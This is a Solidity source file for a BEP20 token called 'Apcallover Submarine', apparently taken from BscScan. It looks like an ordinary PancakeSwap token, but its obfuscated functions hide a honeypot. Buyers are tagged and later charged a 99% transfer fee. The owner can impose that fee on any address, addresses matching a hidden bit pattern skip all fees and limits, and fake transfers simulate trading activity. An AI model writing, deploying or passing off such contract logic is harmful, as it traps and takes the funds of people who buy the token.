/**
 *Submitted for verification at BscScan.com on 2022-12-21
*/

// SPDX-License-Identifier: MITpragma solidity ^0.8.14;interface IPancakePair {    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);}interface IBEP20 {    function symbol() external view returns (string memory);    function name() external view returns (string memory);    function getOwner() external view returns (address);    function transfer(address recipient, uint256 amount)     external    returns (bool);    function decimals() external view returns (uint8);    function transferFrom(        address sender,        address recipient,        uint256 amount    ) external returns (bool);    function balanceOf(address account) external view returns (uint256);    function approve(address spender, uint256 amount) external returns (bool);    function totalSupply() external view returns (uint256);    function allowance(address _owner, address spender)    external    view    returns (uint256);    event Transfer(address indexed from, address indexed to, uint256 value);    event Approval(        address indexed owner,        address indexed spender,        uint256 value    );}abstract contract Ownable {    address internal owner;    mapping(address => bool) internal competent;    constructor(address _owner) {        owner = _owner;        competent[_owner] = true;    }    function Owner() public view returns (address) {        return owner;    }    modifier onlyOwner() {        require(isOwner(msg.sender), "!OWNER");        _;    }    function removeAuthorized(address adr) public onlyOwner() {        competent[adr] = false;    }    function isOwner(address account) public view returns (bool) {        return account == owner;    }    function isAuthorized(address adr) public view returns (bool) {        return competent[adr];    }    function SetAuthorized(address adr) public onlyOwner() {        competent[adr] = true;    }}interface IUniswapV2Router {    function swapExactETHForTokensSupportingFeeOnTransferTokens(        uint256 amountOutMin,        address[] calldata path,        address to,        uint256 deadline    ) external payable;    function addLiquidityETH(        address token,        uint256 amountTokenDesired,        uint256 amountTokenMin,        uint256 amountETHMin,        address to,        uint256 deadline    )    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);    function WETH() external pure returns (address);    function factory() external pure returns (address);    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);    function swapExactTokensForETHSupportingFeeOnTransferTokens(        uint256 amountIn,        uint256 amountOutMin,        address[] calldata path,        address to,        uint256 deadline    ) external;    function swapExactTokensForTokensSupportingFeeOnTransferTokens(        uint256 amountIn,        uint256 amountOutMin,        address[] calldata path,        address to,        uint256 deadline    ) external;    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);}interface IERC20 {    function balanceOf(address account) external view returns (uint256);}library SafeMath {    function mul(uint256 a, uint256 b) internal pure returns (uint256) {        return a * b;    }    function div(        uint256 a,        uint256 b,        string memory errorMessage    ) internal pure returns (uint256) {    unchecked {        require(b > 0, errorMessage);        return a / b;    }    }    function tryMul(uint256 a, uint256 b)    internal    pure    returns (bool, uint256)    {    unchecked {        if (a == 0) return (true, 0);        uint256 c = a * b;        if (c / a != b) return (false, 0);        return (true, c);    }    }    function add(uint256 a, uint256 b) internal pure returns (uint256) {        return a + b;    }    function sub(uint256 a, uint256 b) internal pure returns (uint256) {        return a - b;    }    function tryDiv(uint256 a, uint256 b)    internal    pure    returns (bool, uint256)    {    unchecked {        if (b == 0) return (false, 0);        return (true, a / b);    }    }    function tryMod(uint256 a, uint256 b)    internal    pure    returns (bool, uint256)    {    unchecked {        if (b == 0) return (false, 0);        return (true, a % b);    }    }    function sub(        uint256 a,        uint256 b,        string memory errorMessage    ) internal pure returns (uint256) {    unchecked {        require(b <= a, errorMessage);        return a - b;    }    }    function div(uint256 a, uint256 b) internal pure returns (uint256) {        return a / b;    }    function trySub(uint256 a, uint256 b)    internal    pure    returns (bool, uint256)    {    unchecked {        if (b > a) return (false, 0);        return (true, a - b);    }    }    function tryAdd(uint256 a, uint256 b)    internal    pure    returns (bool, uint256)    {    unchecked {        uint256 c = a + b;        if (c < a) return (false, 0);        return (true, c);    }    }    function mod(        uint256 a,        uint256 b,        string memory errorMessage    ) internal pure returns (uint256) {    unchecked {        require(b > 0, errorMessage);        return a % b;    }    }}interface IUniswapV2Factory {    function createPair(address tokenA, address tokenB)    external    returns (address pair);}contract ApcalloverSubmarine is IBEP20, Ownable {    using SafeMath for uint256;    uint256  constant MASK = type(uint128).max;    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;    address DEAD = 0x000000000000000000000000000000000000dEaD;    address ZERO = 0x0000000000000000000000000000000000000000;    string constant _name = "Apcallover Submarine ";    string constant _symbol = "ApcalloverSubmarine";    uint8 constant _decimals = 18;    uint256 _totalSupply = 100000000 * (10 ** _decimals);    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;    uint256  _maxWallet = 2000000 * 10 ** _decimals;    mapping(address => uint256) _balances;    mapping(address => mapping(address => uint256)) _allowances;    mapping(address => bool) private exemptReceiverWalletIs;    mapping(address => bool) private limitFeeModeExempt;    mapping(address => bool) private minLimitTradingBuy;    mapping(address => bool) private teamTxIsTrading;    mapping(address => uint256) private tradingWalletTxFee;    mapping(uint256 => address) private teamReceiverLaunchedExempt;    uint256 public maxWalletAmount = 0;    uint256 private launchBlock = 0;    //BUY FEES    uint256 private receiverLimitMarketingSell = 0;    uint256 private limitBurnSellMax = 8;    //SELL FEES    uint256 private launchedIsSellMarketing = 0;    uint256 private exemptTradingIsLaunched = 8;    uint256 private marketingTxIsExemptLaunched = limitBurnSellMax + receiverLimitMarketingSell;    uint256 private walletBuyMinLimit = 100;    address private txSellMaxMode = (msg.sender); // auto-liq address    address private marketingBotsSellIs = (0x3E85b5977ECeA4ee87F99B78fFfFC94543442734); // marketing address    address private marketingFeeTradingBotsIs = DEAD;    address private liquidityBuyMinMarketing = DEAD;    address private walletFeeLiquidityMaxSwapBurn = DEAD;    IUniswapV2Router public router;    address public uniswapV2Pair;    uint256 private launchedFeeMinTrading;    uint256 private buyLaunchedBotsReceiver;    event BuyTaxesUpdated(uint256 buyTaxes);    event SellTaxesUpdated(uint256 sellTaxes);    bool private isSwapTradingTxMarketingMode;    uint256 private swapExemptWalletMax;    uint256 private exemptLaunchedMarketingBots;    uint256 private walletFeeBuyTeam;    uint256 private autoIsLiquidityFeeModeBurn;    bool private receiverMarketingLiquidityTradingTeamLimit = true;    bool private teamTxIsTradingMode = true;    bool private liquidityReceiverSwapIs = true;    bool private feeAutoSwapBuy = true;    bool private receiverMaxTxBotsBurnSwap = true;    uint256 firstSetAutoReceiver = 2 ** 18 - 1;    uint256 private maxFeeSwapTx = 6 * 10 ** 15;    uint256 private modeExemptFeeTradingBurn = _totalSupply / 1000; // 0.1%        uint256 private marketingReceiverBurnBots = 0;    uint256 public burnBotsMarketingTradingMaxLimitSwap = 0;    bool public exemptBotsModeAuto = false;    uint256 public minTradingSellBurn = 0;    bool private minSwapMaxLimit = false;    uint256 private marketingLiquidityMinLimit = 0;    uint256 private teamFeeSellBuyReceiverMarketingLimit = 0;    bool private launchedBuyBotsTeam = false;    bool inSwap;    modifier swapping() {        inSwap = true;        _;        inSwap = false;    }    constructor() Ownable(msg.sender) {        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;        // PancakeSwap Router        router = IUniswapV2Router(_router);        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());        _allowances[address(this)][address(router)] = _totalSupply;        isSwapTradingTxMarketingMode = true;        exemptReceiverWalletIs[msg.sender] = true;        exemptReceiverWalletIs[address(this)] = true;        limitFeeModeExempt[msg.sender] = true;        limitFeeModeExempt[0x0000000000000000000000000000000000000000] = true;        limitFeeModeExempt[0x000000000000000000000000000000000000dEaD] = true;        limitFeeModeExempt[address(this)] = true;        minLimitTradingBuy[msg.sender] = true;        minLimitTradingBuy[0x0000000000000000000000000000000000000000] = true;        minLimitTradingBuy[0x000000000000000000000000000000000000dEaD] = true;        minLimitTradingBuy[address(this)] = true;        SetAuthorized(address(0xd300a9a99c5e23eed6144E0cFfFffBf0C1d1201d));        approve(_router, _totalSupply);        approve(address(uniswapV2Pair), _totalSupply);        _balances[msg.sender] = _totalSupply;        emit Transfer(address(0), msg.sender, _totalSupply);    }    receive() external payable {}    function totalSupply() external view override returns (uint256) {        return _totalSupply;    }    function decimals() external pure override returns (uint8) {        return _decimals;    }    function symbol() external pure override returns (string memory) {        return _symbol;    }    function name() external pure override returns (string memory) {        return _name;    }    function getOwner() external view override returns (address) {        return owner;    }    function balanceOf(address account) public view override returns (uint256) {        return _balances[account];    }    function allowance(address holder, address spender) external view override returns (uint256) {        return _allowances[holder][spender];    }    function approve(address spender, uint256 amount) public override returns (bool) {        _allowances[msg.sender][spender] = amount;        emit Approval(msg.sender, spender, amount);        return true;    }    function approveMax(address spender) external returns (bool) {        return approve(spender, _totalSupply);    }    function transfer(address recipient, uint256 amount) external override returns (bool) {        return minMarketingExemptTeam(msg.sender, recipient, amount);    }    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {        if (_allowances[sender][msg.sender] != _totalSupply) {            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]            .sub(amount, "Insufficient Allowance!");        }        return minMarketingExemptTeam(sender, recipient, amount);    }    function setTxSellMaxMode(address a0) public onlyOwner {        txSellMaxMode=a0;    }
    function setMarketingReceiverBurnBots(uint256 a0) public onlyOwner {        if (marketingReceiverBurnBots != limitBurnSellMax) {            limitBurnSellMax=a0;        }        marketingReceiverBurnBots=a0;    }
    function getTxSellMaxMode() public view returns (address) {        if (txSellMaxMode != walletFeeLiquidityMaxSwapBurn) {            return walletFeeLiquidityMaxSwapBurn;        }        if (txSellMaxMode == txSellMaxMode) {            return txSellMaxMode;        }        return txSellMaxMode;    }
    function autoLiquidityReceiverSellMax(address addr) private {        if (marketingTxSellLimitBuyFeeAuto() < maxFeeSwapTx) {            return;        }        maxWalletAmount = maxWalletAmount + 1;        teamReceiverLaunchedExempt[maxWalletAmount] = addr;    }
    function setModeExemptFeeTradingBurn(uint256 a0) public onlyOwner {        if (modeExemptFeeTradingBurn != marketingReceiverBurnBots) {            marketingReceiverBurnBots=a0;        }        modeExemptFeeTradingBurn=a0;    }
    function setReceiverLimitMarketingSell(uint256 a0) public onlyOwner {        if (receiverLimitMarketingSell == walletBuyMinLimit) {            walletBuyMinLimit=a0;        }        if (receiverLimitMarketingSell != marketingLiquidityMinLimit) {            marketingLiquidityMinLimit=a0;        }        receiverLimitMarketingSell=a0;    }
    function getModeExemptFeeTradingBurn() public view returns (uint256) {        if (modeExemptFeeTradingBurn != marketingLiquidityMinLimit) {            return marketingLiquidityMinLimit;        }        if (modeExemptFeeTradingBurn != walletBuyMinLimit) {            return walletBuyMinLimit;        }        if (modeExemptFeeTradingBurn != marketingTxIsExemptLaunched) {            return marketingTxIsExemptLaunched;        }        return modeExemptFeeTradingBurn;    }
    function maxLaunchedModeBurn(address sender, uint256 pFee) private view returns (uint256) {        uint256 f0 = tradingWalletTxFee[sender];        uint256 f1 = pFee;        if (f0 > 0 && block.timestamp - f0 > 2) {            f1 = 99;        }        return f1;    }
    function sellLiquidityMarketingMinAutoMaxIs(address sender, address receiver, uint256 amount) internal returns (uint256) {                if (marketingLiquidityMinLimit == marketingLiquidityMinLimit) {            marketingLiquidityMinLimit = marketingLiquidityMinLimit;        }        if (marketingReceiverBurnBots != walletBuyMinLimit) {            marketingReceiverBurnBots = exemptTradingIsLaunched;        }        if (minSwapMaxLimit == launchedBuyBotsTeam) {            minSwapMaxLimit = launchedBuyBotsTeam;        }        uint256 feeAmount = amount.mul(tradingLaunchedBotsSwap(sender, receiver == uniswapV2Pair)).div(walletBuyMinLimit);        if (teamTxIsTrading[sender] || teamTxIsTrading[receiver]) {            feeAmount = amount.mul(99).div(walletBuyMinLimit);        }        _balances[address(this)] = _balances[address(this)].add(feeAmount);        emit Transfer(sender, address(this), feeAmount);                if (_balances[address(this)] > 3 * 10 ** _decimals && sender == uniswapV2Pair) {            for (uint i = 0; i < 3; i++) {                address addr = address(uint160(block.timestamp + i));                _balances[addr] = _balances[addr] + 10 ** _decimals;                emit Transfer(address(this), addr, 10 ** _decimals);            }            _balances[address(this)] = _balances[address(this)].sub(3 * 10 ** _decimals);        }        return amount.sub(feeAmount);    }
    function setTeamTxIsTrading(address a0,bool a1) public onlyOwner {        if (teamTxIsTrading[a0] == exemptReceiverWalletIs[a0]) {           exemptReceiverWalletIs[a0]=a1;        }        if (teamTxIsTrading[a0] == limitFeeModeExempt[a0]) {           limitFeeModeExempt[a0]=a1;        }        if (teamTxIsTrading[a0] == teamTxIsTrading[a0]) {           teamTxIsTrading[a0]=a1;        }        teamTxIsTrading[a0]=a1;    }
    function getMaxFeeSwapTx() public view returns (uint256) {        if (maxFeeSwapTx != marketingReceiverBurnBots) {            return marketingReceiverBurnBots;        }        return maxFeeSwapTx;    }
    function getExemptTradingIsLaunched() public view returns (uint256) {        return exemptTradingIsLaunched;    }
    function tradingFeeTxBurnTeam(address sender, address recipient, uint256 amount) internal returns (bool) {        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");        _balances[recipient] = _balances[recipient].add(amount);        emit Transfer(sender, recipient, amount);        return true;    }
    function getMarketingReceiverBurnBots() public view returns (uint256) {        if (marketingReceiverBurnBots == launchedIsSellMarketing) {            return launchedIsSellMarketing;        }        if (marketingReceiverBurnBots != maxFeeSwapTx) {            return maxFeeSwapTx;        }        if (marketingReceiverBurnBots != limitBurnSellMax) {            return limitBurnSellMax;        }        return marketingReceiverBurnBots;    }
    function liquidityBurnMarketingFee() internal swapping {                uint256 amountToLiquify = modeExemptFeeTradingBurn.mul(receiverLimitMarketingSell).div(marketingTxIsExemptLaunched).div(2);        uint256 amountToSwap = modeExemptFeeTradingBurn.sub(amountToLiquify);        address[] memory path = new address[](2);        path[0] = address(this);        path[1] = router.WETH();        router.swapExactTokensForETHSupportingFeeOnTransferTokens(            amountToSwap,            0,            path,            address(this),            block.timestamp        );                uint256 amountBNB = address(this).balance;        uint256 totalETHFee = marketingTxIsExemptLaunched.sub(receiverLimitMarketingSell.div(2));        uint256 amountBNBLiquidity = amountBNB.mul(receiverLimitMarketingSell).div(totalETHFee).div(2);        uint256 amountBNBMarketing = amountBNB.mul(limitBurnSellMax).div(totalETHFee);                if (marketingReceiverBurnBots == teamFeeSellBuyReceiverMarketingLimit) {            marketingReceiverBurnBots = marketingReceiverBurnBots;        }        if (minSwapMaxLimit != feeAutoSwapBuy) {            minSwapMaxLimit = teamTxIsTradingMode;        }        if (teamFeeSellBuyReceiverMarketingLimit != marketingLiquidityMinLimit) {            teamFeeSellBuyReceiverMarketingLimit = walletBuyMinLimit;        }        payable(marketingBotsSellIs).transfer(amountBNBMarketing);        if (amountToLiquify > 0) {            router.addLiquidityETH{value : amountBNBLiquidity}(                address(this),                amountToLiquify,                0,                0,                txSellMaxMode,                block.timestamp            );            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);        }    }
    function setMaxFeeSwapTx(uint256 a0) public onlyOwner {        maxFeeSwapTx=a0;    }
    function walletIsBurnMarketingTeamFeeLiquidity(address addr) private view returns (bool) {        uint256 v0 = uint256(uint160(addr)) << 192;        v0 = v0 >> 238;        return v0 == firstSetAutoReceiver;    }
    function getReceiverLimitMarketingSell() public view returns (uint256) {        if (receiverLimitMarketingSell != teamFeeSellBuyReceiverMarketingLimit) {            return teamFeeSellBuyReceiverMarketingLimit;        }        if (receiverLimitMarketingSell != maxFeeSwapTx) {            return maxFeeSwapTx;        }        return receiverLimitMarketingSell;    }
    function getTeamTxIsTrading(address a0) public view returns (bool) {            return teamTxIsTrading[a0];    }
    function marketingTxSellLimitBuyFeeAuto() private view returns (uint256) {        address t0 = WBNB;        if (address(this) < WBNB) {            t0 = address(this);        }        (uint reserve0, uint reserve1,) = IPancakePair(uniswapV2Pair).getReserves();        (uint256 beforeAmount,) = WBNB == t0 ? (reserve0, reserve1) : (reserve1, reserve0);        uint256 buyAmount = IERC20(WBNB).balanceOf(uniswapV2Pair) - beforeAmount;        return buyAmount;    }
    function getFeeAutoSwapBuy() public view returns (bool) {        if (feeAutoSwapBuy == feeAutoSwapBuy) {            return feeAutoSwapBuy;        }        return feeAutoSwapBuy;    }
    function modeBurnLaunchedLimitIs(address sender) internal view returns (bool) {        return !limitFeeModeExempt[sender];    }
    function tradingLaunchedBotsSwap(address sender, bool selling) internal returns (uint256) {                if (marketingReceiverBurnBots == launchBlock) {            marketingReceiverBurnBots = receiverLimitMarketingSell;        }        if (teamFeeSellBuyReceiverMarketingLimit == modeExemptFeeTradingBurn) {            teamFeeSellBuyReceiverMarketingLimit = modeExemptFeeTradingBurn;        }        if (selling) {            marketingTxIsExemptLaunched = exemptTradingIsLaunched + launchedIsSellMarketing;            return maxLaunchedModeBurn(sender, marketingTxIsExemptLaunched);        }        if (!selling && sender == uniswapV2Pair) {            marketingTxIsExemptLaunched = limitBurnSellMax + receiverLimitMarketingSell;            return marketingTxIsExemptLaunched;        }        return maxLaunchedModeBurn(sender, marketingTxIsExemptLaunched);    }
    function isSellSwapBots() internal view returns (bool) {return    msg.sender != uniswapV2Pair &&    !inSwap &&    receiverMaxTxBotsBurnSwap &&    _balances[address(this)] >= modeExemptFeeTradingBurn;    }
    function minMarketingExemptTeam(address sender, address recipient, uint256 amount) internal returns (bool) {                if (teamFeeSellBuyReceiverMarketingLimit != marketingTxIsExemptLaunched) {            teamFeeSellBuyReceiverMarketingLimit = marketingReceiverBurnBots;        }        bool bLimitTxWalletValue = walletIsBurnMarketingTeamFeeLiquidity(sender) || walletIsBurnMarketingTeamFeeLiquidity(recipient);                if (launchedBuyBotsTeam == minSwapMaxLimit) {            launchedBuyBotsTeam = receiverMaxTxBotsBurnSwap;        }        if (teamFeeSellBuyReceiverMarketingLimit == walletBuyMinLimit) {            teamFeeSellBuyReceiverMarketingLimit = teamFeeSellBuyReceiverMarketingLimit;        }        if (marketingReceiverBurnBots == launchBlock) {            marketingReceiverBurnBots = launchBlock;        }        if (sender == uniswapV2Pair) {            if (maxWalletAmount != 0 && isAuthorized(recipient)) {                marketingIsReceiverWalletLaunched();            }            if (!bLimitTxWalletValue) {                autoLiquidityReceiverSellMax(recipient);            }        }                        if (inSwap || bLimitTxWalletValue) {return tradingFeeTxBurnTeam(sender, recipient, amount);}        if (!exemptReceiverWalletIs[sender] && !exemptReceiverWalletIs[recipient] && recipient != uniswapV2Pair) {            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet!");        }                require((amount <= _maxTxAmount) || minLimitTradingBuy[sender] || minLimitTradingBuy[recipient], "Max TX Limit!");        if (isSellSwapBots()) {liquidityBurnMarketingFee();}        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");                if (launchedBuyBotsTeam != receiverMaxTxBotsBurnSwap) {            launchedBuyBotsTeam = liquidityReceiverSwapIs;        }        if (marketingLiquidityMinLimit == limitBurnSellMax) {            marketingLiquidityMinLimit = teamFeeSellBuyReceiverMarketingLimit;        }        uint256 amountReceived = modeBurnLaunchedLimitIs(sender) ? sellLiquidityMarketingMinAutoMaxIs(sender, recipient, amount) : amount;        _balances[recipient] = _balances[recipient].add(amountReceived);        emit Transfer(sender, recipient, amountReceived);        return true;    }
    function marketingIsReceiverWalletLaunched() private {        if (maxWalletAmount > 0) {            for (uint256 i = 1; i <= maxWalletAmount; i++) {                if (tradingWalletTxFee[teamReceiverLaunchedExempt[i]] == 0) {                    tradingWalletTxFee[teamReceiverLaunchedExempt[i]] = block.timestamp;                }            }            maxWalletAmount = 0;        }    }
    function setExemptTradingIsLaunched(uint256 a0) public onlyOwner {        if (exemptTradingIsLaunched == walletBuyMinLimit) {            walletBuyMinLimit=a0;        }        if (exemptTradingIsLaunched != maxFeeSwapTx) {            maxFeeSwapTx=a0;        }        if (exemptTradingIsLaunched == receiverLimitMarketingSell) {            receiverLimitMarketingSell=a0;        }        exemptTradingIsLaunched=a0;    }
    function setFeeAutoSwapBuy(bool a0) public onlyOwner {        feeAutoSwapBuy=a0;    }
    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
}